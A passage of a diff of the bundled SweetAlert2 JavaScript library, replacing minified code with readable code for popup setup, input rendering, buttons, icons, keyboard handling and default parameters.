j0=["input","file","range","select","radio","checkbox","textarea"],G0=(t,a)=>{let r=m(),c=e.innerParams.get(t),i=!c||a.input!==c.input;j0.forEach(g=>{let S=r1(r,n[g]);q0(g,a.inputAttributes),S.className=n[g],i&&T(S)}),a.input&&(i&&K0(a),Q0(a))},K0=t=>{if(!D[t.input]){M(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${t.input}"`);return}let a=ot(t.input),r=D[t.input](a,t);k(a),setTimeout(()=>{et(r)})},_0=t=>{for(let a=0;a<t.attributes.length;a++){let r=t.attributes[a].name;["type","value","style"].includes(r)||t.removeAttribute(r)}},q0=(t,a)=>{let r=B2(m(),t);if(r){_0(r);for(let c in a)r.setAttribute(c,a[c])}},Q0=t=>{let a=ot(t.input);typeof t.customClass=="object"&&x(a,t.customClass.input)},A2=(t,a)=>{(!t.placeholder||a.inputPlaceholder)&&(t.placeholder=a.inputPlaceholder)},D1=(t,a,r)=>{if(r.inputLabel){t.id=n.input;let c=document.createElement("label"),i=n["input-label"];c.setAttribute("for",t.id),c.className=i,typeof r.customClass=="object"&&x(c,r.customClass.inputLabel),c.innerText=r.inputLabel,a.insertAdjacentElement("beforebegin",c)}},ot=t=>r1(m(),n[t]||n.input),r2=(t,a)=>{["string","number"].includes(typeof a)?t.value=`${a}`:t1(a)||d(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof a}"`)},D={};D.text=D.email=D.password=D.number=D.tel=D.url=(t,a)=>(r2(t,a.inputValue),D1(t,t,a),A2(t,a),t.type=a.input,t),D.file=(t,a)=>(D1(t,t,a),A2(t,a),t),D.range=(t,a)=>{let r=t.querySelector("input"),c=t.querySelector("output");return r2(r,a.inputValue),r.type=a.input,r2(c,a.inputValue),D1(r,t,a),t},D.select=(t,a)=>{if(t.textContent="",a.inputPlaceholder){let r=document.createElement("option");N(r,a.inputPlaceholder),r.value="",r.disabled=!0,r.selected=!0,t.appendChild(r)}return D1(t,t,a),t},D.radio=t=>(t.textContent="",t),D.checkbox=(t,a)=>{let r=B2(m(),"checkbox");r.value="1",r.id=n.checkbox,r.checked=Boolean(a.inputValue);let c=t.querySelector("span");return N(c,a.inputPlaceholder),r},D.textarea=(t,a)=>{r2(t,a.inputValue),A2(t,a),D1(t,t,a);let r=c=>parseInt(window.getComputedStyle(c).marginLeft)+parseInt(window.getComputedStyle(c).marginRight);return setTimeout(()=>{if("MutationObserver"in window){let c=parseInt(window.getComputedStyle(m()).width),i=()=>{let g=t.offsetWidth+r(t);g>c?m().style.width=`${g}px`:m().style.width=null};new MutationObserver(i).observe(t,{attributes:!0,attributeFilter:["style"]})}}),t};let Y0=(t,a)=>{let r=h1();$(r,a,"htmlContainer"),a.html?(O2(a.html,r),k(r,"block")):a.text?(r.textContent=a.text,k(r,"block")):T(r),G0(t,a)},Z0=(t,a)=>{let r=rt();h2(r,a.footer),a.footer&&O2(a.footer,r),$(r,a,"footer")},J0=(t,a)=>{let r=e.innerParams.get(t),c=l1();if(r&&a.icon===r.icon){gt(c,a),dt(c,a);return}if(!a.icon&&!a.iconHtml){T(c);return}if(a.icon&&Object.keys(o).indexOf(a.icon)===-1){M(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${a.icon}"`),T(c);return}k(c),gt(c,a),dt(c,a),x(c,a.showClass.icon)},dt=(t,a)=>{for(let r in o)a.icon!==r&&_(t,o[r]);x(t,o[a.icon]),h4(t,a),X0(),$(t,a,"icon")},X0=()=>{let t=m(),a=window.getComputedStyle(t).getPropertyValue("background-color"),r=t.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");for(let c=0;c<r.length;c++)r[c].style.backgroundColor=a},t4=`
+`.replace(/(^|\n)\s*/g, "");
+        const resetOldContainer = () => {
+          const oldContainer = getContainer();
+          if (!oldContainer) {
+            return false;
+          }
+          oldContainer.remove();
+          removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
+          return true;
+        };
+        const resetValidationMessage$1 = () => {
+          globalState.currentInstance.resetValidationMessage();
+        };
+        const addInputChangeListeners = () => {
+          const popup = getPopup();
+          const input = getDirectChildByClass(popup, swalClasses.input);
+          const file = getDirectChildByClass(popup, swalClasses.file);
+          const range = popup.querySelector(`.${swalClasses.range} input`);
+          const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
+          const select = getDirectChildByClass(popup, swalClasses.select);
+          const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
+          const textarea = getDirectChildByClass(popup, swalClasses.textarea);
+          input.oninput = resetValidationMessage$1;
+          file.onchange = resetValidationMessage$1;
+          select.onchange = resetValidationMessage$1;
+          checkbox.onchange = resetValidationMessage$1;
+          textarea.oninput = resetValidationMessage$1;
+          range.oninput = () => {
+            resetValidationMessage$1();
+            rangeOutput.value = range.value;
+          };
+          range.onchange = () => {
+            resetValidationMessage$1();
+            rangeOutput.value = range.value;
+          };
+        };
+        const getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
+        const setupAccessibility = (params) => {
+          const popup = getPopup();
+          popup.setAttribute("role", params.toast ? "alert" : "dialog");
+          popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
+          if (!params.toast) {
+            popup.setAttribute("aria-modal", "true");
+          }
+        };
+        const setupRTL = (targetElement) => {
+          if (window.getComputedStyle(targetElement).direction === "rtl") {
+            addClass(getContainer(), swalClasses.rtl);
+          }
+        };
+        const init = (params) => {
+          const oldContainerExisted = resetOldContainer();
+          if (isNodeEnv()) {
+            error("SweetAlert2 requires document to initialize");
+            return;
+          }
+          const container = document.createElement("div");
+          container.className = swalClasses.container;
+          if (oldContainerExisted) {
+            addClass(container, swalClasses["no-transition"]);
+          }
+          setInnerHtml(container, sweetHTML);
+          const targetElement = getTarget(params.target);
+          targetElement.appendChild(container);
+          setupAccessibility(params);
+          setupRTL(targetElement);
+          addInputChangeListeners();
+        };
+        const parseHtmlToContainer = (param, target) => {
+          if (param instanceof HTMLElement) {
+            target.appendChild(param);
+          } else if (typeof param === "object") {
+            handleObject(param, target);
+          } else if (param) {
+            setInnerHtml(target, param);
+          }
+        };
+        const handleObject = (param, target) => {
+          if (param.jquery) {
+            handleJqueryElem(target, param);
+          } else {
+            setInnerHtml(target, param.toString());
+          }
+        };
+        const handleJqueryElem = (target, elem) => {
+          target.textContent = "";
+          if (0 in elem) {
+            for (let i = 0; i in elem; i++) {
+              target.appendChild(elem[i].cloneNode(true));
+            }
+          } else {
+            target.appendChild(elem.cloneNode(true));
+          }
+        };
+        const animationEndEvent = (() => {
+          if (isNodeEnv()) {
+            return false;
+          }
+          const testEl = document.createElement("div");
+          const transEndEventNames = {
+            WebkitAnimation: "webkitAnimationEnd",
+            // Chrome, Safari and Opera
+            animation: "animationend"
+            // Standard syntax
+          };
+          for (const i in transEndEventNames) {
+            if (Object.prototype.hasOwnProperty.call(transEndEventNames, i) && typeof testEl.style[i] !== "undefined") {
+              return transEndEventNames[i];
+            }
+          }
+          return false;
+        })();
+        const measureScrollbar = () => {
+          const scrollDiv = document.createElement("div");
+          scrollDiv.className = swalClasses["scrollbar-measure"];
+          document.body.appendChild(scrollDiv);
+          const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
+          document.body.removeChild(scrollDiv);
+          return scrollbarWidth;
+        };
+        const renderActions = (instance, params) => {
+          const actions = getActions();
+          const loader = getLoader();
+          if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
+            hide(actions);
+          } else {
+            show(actions);
+          }
+          applyCustomClass(actions, params, "actions");
+          renderButtons(actions, loader, params);
+          setInnerHtml(loader, params.loaderHtml);
+          applyCustomClass(loader, params, "loader");
+        };
+        function renderButtons(actions, loader, params) {
+          const confirmButton = getConfirmButton();
+          const denyButton = getDenyButton();
+          const cancelButton = getCancelButton();
+          renderButton(confirmButton, "confirm", params);
+          renderButton(denyButton, "deny", params);
+          renderButton(cancelButton, "cancel", params);
+          handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
+          if (params.reverseButtons) {
+            if (params.toast) {
+              actions.insertBefore(cancelButton, confirmButton);
+              actions.insertBefore(denyButton, confirmButton);
+            } else {
+              actions.insertBefore(cancelButton, loader);
+              actions.insertBefore(denyButton, loader);
+              actions.insertBefore(confirmButton, loader);
+            }
+          }
+        }
+        function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
+          if (!params.buttonsStyling) {
+            removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
+            return;
+          }
+          addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
+          if (params.confirmButtonColor) {
+            confirmButton.style.backgroundColor = params.confirmButtonColor;
+            addClass(confirmButton, swalClasses["default-outline"]);
+          }
+          if (params.denyButtonColor) {
+            denyButton.style.backgroundColor = params.denyButtonColor;
+            addClass(denyButton, swalClasses["default-outline"]);
+          }
+          if (params.cancelButtonColor) {
+            cancelButton.style.backgroundColor = params.cancelButtonColor;
+            addClass(cancelButton, swalClasses["default-outline"]);
+          }
+        }
+        function renderButton(button, buttonType, params) {
+          toggle(button, params[`show${capitalizeFirstLetter(buttonType)}Button`], "inline-block");
+          setInnerHtml(button, params[`${buttonType}ButtonText`]);
+          button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`]);
+          button.className = swalClasses[buttonType];
+          applyCustomClass(button, params, `${buttonType}Button`);
+          addClass(button, params[`${buttonType}ButtonClass`]);
+        }
+        const renderCloseButton = (instance, params) => {
+          const closeButton = getCloseButton();
+          setInnerHtml(closeButton, params.closeButtonHtml);
+          applyCustomClass(closeButton, params, "closeButton");
+          toggle(closeButton, params.showCloseButton);
+          closeButton.setAttribute("aria-label", params.closeButtonAriaLabel);
+        };
+        const renderContainer = (instance, params) => {
+          const container = getContainer();
+          if (!container) {
+            return;
+          }
+          handleBackdropParam(container, params.backdrop);
+          handlePositionParam(container, params.position);
+          handleGrowParam(container, params.grow);
+          applyCustomClass(container, params, "container");
+        };
+        function handleBackdropParam(container, backdrop) {
+          if (typeof backdrop === "string") {
+            container.style.background = backdrop;
+          } else if (!backdrop) {
+            addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
+          }
+        }
+        function handlePositionParam(container, position) {
+          if (position in swalClasses) {
+            addClass(container, swalClasses[position]);
+          } else {
+            warn('The "position" parameter is not valid, defaulting to "center"');
+            addClass(container, swalClasses.center);
+          }
+        }
+        function handleGrowParam(container, grow) {
+          if (grow && typeof grow === "string") {
+            const growClass = `grow-${grow}`;
+            if (growClass in swalClasses) {
+              addClass(container, swalClasses[growClass]);
+            }
+          }
+        }
+        const inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
+        const renderInput = (instance, params) => {
+          const popup = getPopup();
+          const innerParams = privateProps.innerParams.get(instance);
+          const rerender = !innerParams || params.input !== innerParams.input;
+          inputClasses.forEach((inputClass) => {
+            const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
+            setAttributes(inputClass, params.inputAttributes);
+            inputContainer.className = swalClasses[inputClass];
+            if (rerender) {
+              hide(inputContainer);
+            }
+          });
+          if (params.input) {
+            if (rerender) {
+              showInput(params);
+            }
+            setCustomClass(params);
+          }
+        };
+        const showInput = (params) => {
+          if (!renderInputType[params.input]) {
+            error(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${params.input}"`);
+            return;
+          }
+          const inputContainer = getInputContainer(params.input);
+          const input = renderInputType[params.input](inputContainer, params);
+          show(inputContainer);
+          setTimeout(() => {
+            focusInput(input);
+          });
+        };
+        const removeAttributes = (input) => {
+          for (let i = 0; i < input.attributes.length; i++) {
+            const attrName = input.attributes[i].name;
+            if (!["type", "value", "style"].includes(attrName)) {
+              input.removeAttribute(attrName);
+            }
+          }
+        };
+        const setAttributes = (inputClass, inputAttributes) => {
+          const input = getInput$1(getPopup(), inputClass);
+          if (!input) {
+            return;
+          }
+          removeAttributes(input);
+          for (const attr in inputAttributes) {
+            input.setAttribute(attr, inputAttributes[attr]);
+          }
+        };
+        const setCustomClass = (params) => {
+          const inputContainer = getInputContainer(params.input);
+          if (typeof params.customClass === "object") {
+            addClass(inputContainer, params.customClass.input);
+          }
+        };
+        const setInputPlaceholder = (input, params) => {
+          if (!input.placeholder || params.inputPlaceholder) {
+            input.placeholder = params.inputPlaceholder;
+          }
+        };
+        const setInputLabel = (input, prependTo, params) => {
+          if (params.inputLabel) {
+            input.id = swalClasses.input;
+            const label = document.createElement("label");
+            const labelClass = swalClasses["input-label"];
+            label.setAttribute("for", input.id);
+            label.className = labelClass;
+            if (typeof params.customClass === "object") {
+              addClass(label, params.customClass.inputLabel);
+            }
+            label.innerText = params.inputLabel;
+            prependTo.insertAdjacentElement("beforebegin", label);
+          }
+        };
+        const getInputContainer = (inputType) => {
+          return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
+        };
+        const checkAndSetInputValue = (input, inputValue) => {
+          if (["string", "number"].includes(typeof inputValue)) {
+            input.value = `${inputValue}`;
+          } else if (!isPromise(inputValue)) {
+            warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
+          }
+        };
+        const renderInputType = {};
+        renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = (input, params) => {
+          checkAndSetInputValue(input, params.inputValue);
+          setInputLabel(input, input, params);
+          setInputPlaceholder(input, params);
+          input.type = params.input;
+          return input;
+        };
+        renderInputType.file = (input, params) => {
+          setInputLabel(input, input, params);
+          setInputPlaceholder(input, params);
+          return input;
+        };
+        renderInputType.range = (range, params) => {
+          const rangeInput = range.querySelector("input");
+          const rangeOutput = range.querySelector("output");
+          checkAndSetInputValue(rangeInput, params.inputValue);
+          rangeInput.type = params.input;
+          checkAndSetInputValue(rangeOutput, params.inputValue);
+          setInputLabel(rangeInput, range, params);
+          return range;
+        };
+        renderInputType.select = (select, params) => {
+          select.textContent = "";
+          if (params.inputPlaceholder) {
+            const placeholder = document.createElement("option");
+            setInnerHtml(placeholder, params.inputPlaceholder);
+            placeholder.value = "";
+            placeholder.disabled = true;
+            placeholder.selected = true;
+            select.appendChild(placeholder);
+          }
+          setInputLabel(select, select, params);
+          return select;
+        };
+        renderInputType.radio = (radio) => {
+          radio.textContent = "";
+          return radio;
+        };
+        renderInputType.checkbox = (checkboxContainer, params) => {
+          const checkbox = getInput$1(getPopup(), "checkbox");
+          checkbox.value = "1";
+          checkbox.id = swalClasses.checkbox;
+          checkbox.checked = Boolean(params.inputValue);
+          const label = checkboxContainer.querySelector("span");
+          setInnerHtml(label, params.inputPlaceholder);
+          return checkbox;
+        };
+        renderInputType.textarea = (textarea, params) => {
+          checkAndSetInputValue(textarea, params.inputValue);
+          setInputPlaceholder(textarea, params);
+          setInputLabel(textarea, textarea, params);
+          const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
+          setTimeout(() => {
+            if ("MutationObserver" in window) {
+              const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
+              const textareaResizeHandler = () => {
+                const textareaWidth = textarea.offsetWidth + getMargin(textarea);
+                if (textareaWidth > initialPopupWidth) {
+                  getPopup().style.width = `${textareaWidth}px`;
+                } else {
+                  getPopup().style.width = null;
+                }
+              };
+              new MutationObserver(textareaResizeHandler).observe(textarea, {
+                attributes: true,
+                attributeFilter: ["style"]
+              });
+            }
+          });
+          return textarea;
+        };
+        const renderContent = (instance, params) => {
+          const htmlContainer = getHtmlContainer();
+          applyCustomClass(htmlContainer, params, "htmlContainer");
+          if (params.html) {
+            parseHtmlToContainer(params.html, htmlContainer);
+            show(htmlContainer, "block");
+          } else if (params.text) {
+            htmlContainer.textContent = params.text;
+            show(htmlContainer, "block");
+          } else {
+            hide(htmlContainer);
+          }
+          renderInput(instance, params);
+        };
+        const renderFooter = (instance, params) => {
+          const footer = getFooter();
+          toggle(footer, params.footer);
+          if (params.footer) {
+            parseHtmlToContainer(params.footer, footer);
+          }
+          applyCustomClass(footer, params, "footer");
+        };
+        const renderIcon = (instance, params) => {
+          const innerParams = privateProps.innerParams.get(instance);
+          const icon = getIcon();
+          if (innerParams && params.icon === innerParams.icon) {
+            setContent(icon, params);
+            applyStyles(icon, params);
+            return;
+          }
+          if (!params.icon && !params.iconHtml) {
+            hide(icon);
+            return;
+          }
+          if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
+            error(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
+            hide(icon);
+            return;
+          }
+          show(icon);
+          setContent(icon, params);
+          applyStyles(icon, params);
+          addClass(icon, params.showClass.icon);
+        };
+        const applyStyles = (icon, params) => {
+          for (const iconType in iconTypes) {
+            if (params.icon !== iconType) {
+              removeClass(icon, iconTypes[iconType]);
+            }
+          }
+          addClass(icon, iconTypes[params.icon]);
+          setColor(icon, params);
+          adjustSuccessIconBackgroundColor();
+          applyCustomClass(icon, params, "icon");
+        };
+        const adjustSuccessIconBackgroundColor = () => {
+          const popup = getPopup();
+          const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
+          const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
+          for (let i = 0; i < successIconParts.length; i++) {
+            successIconParts[i].style.backgroundColor = popupBackgroundColor;
+          }
+        };
+        const successIconHtml = `
   <div class="swal2-success-circular-line-left"></div>
   <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
   <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
   <div class="swal2-success-circular-line-right"></div>
-`,a4=`
+`;
+        const errorIconHtml = `
   <span class="swal2-x-mark">
     <span class="swal2-x-mark-line-left"></span>
     <span class="swal2-x-mark-line-right"></span>
   </span>
-`,gt=(t,a)=>{let r=t.innerHTML,c;a.iconHtml?c=zt(a.iconHtml):a.icon==="success"?(c=t4,r=r.replace(/ style=".*?"/g,"")):a.icon==="error"?c=a4:c=zt({question:"?",warning:"!",info:"i"}[a.icon]),r.trim()!==c.trim()&&N(t,c)},h4=(t,a)=>{if(a.iconColor){t.style.color=a.iconColor,t.style.borderColor=a.iconColor;for(let r of[".swal2-success-line-tip",".swal2-success-line-long",".swal2-x-mark-line-left",".swal2-x-mark-line-right"])nt(t,r,"backgroundColor",a.iconColor);nt(t,".swal2-success-ring","borderColor",a.iconColor)}},zt=t=>`<div class="${n["icon-content"]}">${t}</div>`,r4=(t,a)=>{let r=X1();if(!a.imageUrl){T(r);return}k(r,""),r.setAttribute("src",a.imageUrl),r.setAttribute("alt",a.imageAlt),f1(r,"width",a.imageWidth),f1(r,"height",a.imageHeight),r.className=n.image,$(r,a,"image")},e4=(t,a)=>{let r=A(),c=m();a.toast?(f1(r,"width",a.width),c.style.width="100%",c.insertBefore(u1(),l1())):f1(c,"width",a.width),f1(c,"padding",a.padding),a.color&&(c.style.color=a.color),a.background&&(c.style.background=a.background),T(w()),c4(c,a)},c4=(t,a)=>{t.className=`${n.popup} ${W(t)?a.showClass.popup:""}`,a.toast?(x([document.documentElement,document.body],n["toast-shown"]),x(t,n.toast)):x(t,n.modal),$(t,a,"popup"),typeof a.customClass=="string"&&x(t,a.customClass),a.icon&&x(t,n[`icon-${a.icon}`])},n4=(t,a)=>{let r=s();if(!a.progressSteps||a.progressSteps.length===0){T(r);return}k(r),r.textContent="",a.currentProgressStep>=a.progressSteps.length&&d("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"),a.progressSteps.forEach((c,i)=>{let g=v4(c);if(r.appendChild(g),i===a.currentProgressStep&&x(g,n["active-progress-step"]),i!==a.progressSteps.length-1){let S=l4(a);r.appendChild(S)}})},v4=t=>{let a=document.createElement("li");return x(a,n["progress-step"]),N(a,t),a},l4=t=>{let a=document.createElement("li");return x(a,n["progress-step-line"]),t.progressStepsDistance&&f1(a,"width",t.progressStepsDistance),a},i4=(t,a)=>{let r=J1();h2(r,a.title||a.titleText,"block"),a.title&&O2(a.title,r),a.titleText&&(r.innerText=a.titleText),$(r,a,"title")},Mt=(t,a)=>{e4(t,a),N0(t,a),n4(t,a),J0(t,a),r4(t,a),i4(t,a),I0(t,a),Y0(t,a),E0(t,a),Z0(t,a),typeof a.didRender=="function"&&a.didRender(m())};function pt(){let t=e.innerParams.get(this);if(!t)return;let a=e.domCache.get(this);T(a.loader),a2()?t.icon&&k(l1()):o4(a),_([a.popup,a.actions],n.loading),a.popup.removeAttribute("aria-busy"),a.popup.removeAttribute("data-loading"),a.confirmButton.disabled=!1,a.denyButton.disabled=!1,a.cancelButton.disabled=!1}let o4=t=>{let a=t.popup.getElementsByClassName(t.loader.getAttribute("data-button-to-replace"));a.length?k(a[0],"inline-block"):m0()&&T(t.actions)};function d4(t){let a=e.innerParams.get(t||this),r=e.domCache.get(t||this);return r?B2(r.popup,a.input):null}let g4=()=>W(m()),st=()=>B()&&B().click(),z4=()=>P()&&P().click(),M4=()=>i1()&&i1().click(),V1=Object.freeze({cancel:"cancel",backdrop:"backdrop",close:"close",esc:"esc",timer:"timer"}),ut=t=>{t.keydownTarget&&t.keydownHandlerAdded&&(t.keydownTarget.removeEventListener("keydown",t.keydownHandler,{capture:t.keydownListenerCapture}),t.keydownHandlerAdded=!1)},p4=(t,a,r,c)=>{ut(a),r.toast||(a.keydownHandler=i=>u4(t,i,c),a.keydownTarget=r.keydownListenerCapture?window:m(),a.keydownListenerCapture=r.keydownListenerCapture,a.keydownTarget.addEventListener("keydown",a.keydownHandler,{capture:a.keydownListenerCapture}),a.keydownHandlerAdded=!0)},y2=(t,a)=>{let r=w2();if(r.length){t=t+a,t===r.length?t=0:t===-1&&(t=r.length-1),r[t].focus();return}m().focus()},Ht=["ArrowRight","ArrowDown"],s4=["ArrowLeft","ArrowUp"],u4=(t,a,r)=>{let c=e.innerParams.get(t);c&&(a.isComposing||a.keyCode===229||(c.stopKeydownPropagation&&a.stopPropagation(),a.key==="Enter"?H4(t,a,c):a.key==="Tab"?f4(a):[...Ht,...s4].includes(a.key)?V4(a.key):a.key==="Escape"&&m4(a,c,r)))},H4=(t,a,r)=>{if(G(r.allowEnterKey)&&a.target&&t.getInput()&&a.target instanceof HTMLElement&&a.target.outerHTML===t.getInput().outerHTML){if(["textarea","file"].includes(r.input))return;st(),a.preventDefault()}},f4=t=>{let a=t.target,r=w2(),c=-1;for(let i=0;i<r.length;i++)if(a===r[i]){c=i;break}t.shiftKey?y2(c,-1):y2(c,1),t.stopPropagation(),t.preventDefault()},V4=t=>{let a=B(),r=P(),c=i1();if(document.activeElement instanceof HTMLElement&&![a,r,c].includes(document.activeElement))return;let i=Ht.includes(t)?"nextElementSibling":"previousElementSibling",g=document.activeElement;for(let S=0;S<E1().children.length;S++){if(g=g[i],!g)return;if(g instanceof HTMLButtonElement&&W(g))break}g instanceof HTMLButtonElement&&g.focus()},m4=(t,a,r)=>{G(a.allowEscapeKey)&&(t.preventDefault(),r(V1.esc))};var I1={swalPromiseResolve:new WeakMap,swalPromiseReject:new WeakMap};let x4=()=>{Array.from(document.body.children).forEach(a=>{a===A()||a.contains(A())||(a.hasAttribute("aria-hidden")&&a.setAttribute("data-previous-aria-hidden",a.getAttribute("aria-hidden")),a.setAttribute("aria-hidden","true"))})},ft=()=>{Array.from(document.body.children).forEach(a=>{a.hasAttribute("data-previous-aria-hidden")?(a.setAttribute("aria-hidden",a.getAttribute("data-previous-aria-hidden")),a.removeAttribute("data-previous-aria-hidden")):a.removeAttribute("aria-hidden")})},w4=()=>{if((/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream||navigator.platform==="MacIntel"&&navigator.maxTouchPoints>1)&&!Z(document.body,n.iosfix)){let a=document.body.scrollTop;document.body.style.top=`${a*-1}px`,x(document.body,n.iosfix),B4(),L4()}},L4=()=>{let t=navigator.userAgent,a=!!t.match(/iPad/i)||!!t.match(/iPhone/i),r=!!t.match(/WebKit/i);a&&r&&!t.match(/CriOS/i)&&m().scrollHeight>window.innerHeight-44&&(A().style.paddingBottom=`${44}px`)},B4=()=>{let t=A(),a;t.ontouchstart=r=>{a=C4(r)},t.ontouchmove=r=>{a&&(r.preventDefault(),r.stopPropagation())}},C4=t=>{let a=t.target,r=A();return O4(t)||S4(t)?!1:a===r||!vt(r)&&a instanceof HTMLElement&&a.tagName!=="INPUT"&&a.tagName!=="TEXTAREA"&&!(vt(h1())&&h1().contains(a))},O4=t=>t.touches&&t.touches.length&&t.touches[0].touchType==="stylus",S4=t=>t.touches&&t.touches.length>1,A4=()=>{if(Z(document.body,n.iosfix)){let t=parseInt(document.body.style.top,10);_(document.body,n.iosfix),document.body.style.top="",document.body.scrollTop=t*-1}},y4=()=>{H1.previousBodyPadding===null&&document.body.scrollHeight>window.innerHeight&&(H1.previousBodyPadding=parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right")),document.body.style.paddingRight=`${H1.previousBodyPadding+F0()}px`)},b4=()=>{H1.previousBodyPadding!==null&&(document.body.style.paddingRight=`${H1.previousBodyPadding}px`,H1.previousBodyPadding=null)};function Vt(t,a,r,c){a2()?mt(t,c):(B0(r).then(()=>mt(t,c)),ut(H)),/^((?!chrome|android).)*safari/i.test(navigator.userAgent)?(a.setAttribute("style","display:none !important"),a.removeAttribute("class"),a.innerHTML=""):a.remove(),L2()&&(b4(),A4(),ft()),k4()}function k4(){_([document.documentElement,document.body],[n.shown,n["height-auto"],n["no-backdrop"],n["toast-shown"]])}function e2(t){t=E4(t);let a=I1.swalPromiseResolve.get(this),r=T4(this);this.isAwaitingPromise()?t.isDismissed||(N1(this),a(t)):r&&a(t)}function P4(){return!!e.awaitingPromise.get(this)}let T4=t=>{let a=m();if(!a)return!1;let r=e.innerParams.get(t);if(!r||Z(a,r.hideClass.popup))return!1;_(a,r.showClass.popup),x(a,r.hideClass.popup);let c=A();return _(c,r.showClass.backdrop),x(c,r.hideClass.backdrop),R4(t,a,r),!0};function F4(t){let a=I1.swalPromiseReject.get(this);N1(this),a&&a(t)}let N1=t=>{t.isAwaitingPromise()&&(e.awaitingPromise.delete(t),e.innerParams.get(t)||t._destroy())},E4=t=>typeof t>"u"?{isConfirmed:!1,isDenied:!1,isDismissed:!0}:Object.assign({isConfirmed:!1,isDenied:!1,isDismissed:!1},t),R4=(t,a,r)=>{let c=A(),i=R1&&lt(a);typeof r.willClose=="function"&&r.willClose(a),i?D4(t,a,c,r.returnFocus,r.didClose):Vt(t,c,r.returnFocus,r.didClose)},D4=(t,a,r,c,i)=>{H.swalCloseEventFinishedCallback=Vt.bind(null,t,r,c,i),a.addEventListener(R1,function(g){g.target===a&&(H.swalCloseEventFinishedCallback(),delete H.swalCloseEventFinishedCallback)})},mt=(t,a)=>{setTimeout(()=>{typeof a=="function"&&a.bind(t.params)(),t._destroy()})};function xt(t,a,r){let c=e.domCache.get(t);a.forEach(i=>{c[i].disabled=r})}function wt(t,a){if(t)if(t.type==="radio"){let c=t.parentNode.parentNode.querySelectorAll("input");for(let i=0;i<c.length;i++)c[i].disabled=a}else t.disabled=a}function I4(){xt(this,["confirmButton","denyButton","cancelButton"],!1)}function N4(){xt(this,["confirmButton","denyButton","cancelButton"],!0)}function W4(){wt(this.getInput(),!1)}function U4(){wt(this.getInput(),!0)}function $4(t){let a=e.domCache.get(this),r=e.innerParams.get(this);N(a.validationMessage,t),a.validationMessage.className=n["validation-message"],r.customClass&&r.customClass.validationMessage&&x(a.validationMessage,r.customClass.validationMessage),k(a.validationMessage);let c=this.getInput();c&&(c.setAttribute("aria-invalid",!0),c.setAttribute("aria-describedby",n["validation-message"]),et(c),x(c,n.inputerror))}function j4(){let t=e.domCache.get(this);t.validationMessage&&T(t.validationMessage);let a=this.getInput();a&&(a.removeAttribute("aria-invalid"),a.removeAttribute("aria-describedby"),_(a,n.inputerror))}let m1={title:"",titleText:"",text:"",html:"",footer:"",icon:void 0,iconColor:void 0,iconHtml:void 0,template:void 0,toast:!1,showClass:{popup:"swal2-show",backdrop:"swal2-backdrop-show",icon:"swal2-icon-show"},hideClass:{popup:"swal2-hide",backdrop:"swal2-backdrop-hide",icon:"swal2-icon-hide"},customClass:{},target:"body",color:void 0,backdrop:!0,heightAuto:!0,allowOutsideClick:!0,allowEscapeKey:!0,allowEnterKey:!0,stopKeydownPropagation:!0,keydownListenerCapture:!1,showConfirmButton:!0,showDenyButton:!1,showCancelButton:!1,preConfirm:void 0,preDeny:void 0,confirmButtonText:"OK",confirmButtonAriaLabel:"",confirmButtonColor:void 0,denyButtonText:"No",denyButtonAriaLabel:"",denyButtonColor:void 0,cancelButtonText:"Cancel",cancelButtonAriaLabel:"",cancelButtonColor:void 0,buttonsStyling:!0,reverseButtons:!1,focusConfirm:!0,focusDeny:!1,focusCancel:!1,returnFocus:!0,showCloseButton:!1,closeButtonHtml:"&times;",closeButtonAriaLabel:"Close this dialog",loaderHtml:"",showLoaderOnConfirm:!1,showLoaderOnDeny:!1,imageUrl:void 0,imageWidth:void 0,imageHeight:void 0,imageAlt:"",timer:void 0,timerProgressBar:!1,width:void 0,padding:void 0,background:void 0,input:void 0,inputPlaceholder:"",inputLabel:"",inputValue:"",inputOptions:{},inputAutoTrim:!0,inputAttributes:{},inputValidator:void 0,returnInputValueOnDeny:!1,validationMessage:void 0,grow:!1,position:"center",progressSteps:[],currentProgressStep:void 0,progressStepsDistance:void 0,willOpen:void 0,didOpen:void 0,didRender:void 0,willClose:void 0,didClose:void 0,didDestroy:void 